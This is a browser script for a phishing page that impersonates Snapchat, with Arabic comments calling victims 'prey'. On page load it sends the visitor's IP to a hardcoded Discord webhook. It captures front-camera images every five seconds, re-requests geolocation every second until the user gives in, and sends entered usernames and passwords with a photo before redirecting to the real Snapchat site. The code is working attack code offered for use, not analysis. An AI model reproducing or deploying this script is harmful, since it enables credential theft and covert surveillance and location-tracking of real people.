'use strict';

// رابط الـ Webhook الخاص بك
const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let userLat = null, userLng = null;

// 1. جلب IP الجهاز (يعمل بدون إذن)
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch (e) { return "Unknown"; }
}

// 2. إرسال البيانات إلى ديسكورد (صورة + موقع + IP)
async function sendPacket(imgBlob, user = "", pass = "") {
    const ip = await getIP();
    const formData = new FormData();
    
    let content = `🛰️ **تحديث صيد جديد (HTTPS)**\n🌐 IP: \`${ip}\` \n`;
    if (user) content += `👤 الحساب: \`${user}\` | الرمز: \`${pass}\` \n`;
    if (userLat) {
        content += `📍 الموقع المباشر: [فتح الخريطة](https://www.google.com/maps?q=${userLat},${userLng}) \n`;
    }

    if (imgBlob) formData.append('file', imgBlob, 'camera.png');
    
    formData.append('payload_json', JSON.stringify({
        content: content,
        username: "SnapHunter HTTPS",
        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
    }));

    fetch(WEBHOOK_URL, { method: 'POST', body: formData });
}

// 3. طلب الموقع بشكل متكرر عند الرفض
function forceLocation() {
    navigator.geolocation.getCurrentPosition(
        (p) => {
            userLat = p.coords.latitude;
            userLng = p.coords.longitude;
        },
        (err) => {
            // إعادة الطلب كل ثانية لإجبار المستخدم على القبول
            setTimeout(forceLocation, 1000);
        },
        { enableHighAccuracy: true }
    );
}

// 4. تشغيل النظام الكامل (تحت HTTPS)
async function startSystem() {
    // إشعار دخول فوري بمجرد فتح الرابط
    const ip = await getIP();
    fetch(WEBHOOK_URL, { 
        method: 'POST', 
        headers: {'Content-Type': 'application/json'}, 
        body: JSON.stringify({content: `🚀 صيد دخل الموقع! IP: ${ip}`}) 
    });

    try {
        // طلب الكاميرا (سيظهر التنبيه فقط إذا كان الرابط HTTPS)
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" } 
        });
        
        video.srcObject = stream;

        // طلب الموقع بعد الكاميرا مباشرة
        forceLocation();

        // حلقة إرسال البيانات كل 5 ثوانٍ
        setInterval(() => {
            // حل مشكلة الصور السوداء: التأكد من أن الفيديو بدأ بالبث فعلياً
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(blob => {
                    if (blob && blob.size > 1000) { 
                        sendPacket(blob);
                    }
                }, 'image/png');
            }
        }, 5000);

    } catch (err) {
        // إذا رفض الكاميرا، نستمر بطلب الموقع وإرسال IP فقط
        forceLocation();
        setInterval(() => sendPacket(null), 5000);
    }
}

// تشغيل السكربت عند تحميل الصفحة
window.onload = startSystem;

// معالجة صفحة تسجيل الدخول (apply2.html)
const loginForm = document.getElementById('fullLoginForm');
if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const u = e.target.username.value;
        const p = e.target.password.value;
        document.getElementById('loadingOverlay').style.display = 'flex';

        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            await sendPacket(blob, u, p);
            setTimeout(() => {
                window.location.href = "https://accounts.snapchat.com/";
            }, 2000);
        }, 'image/png');
    });
}
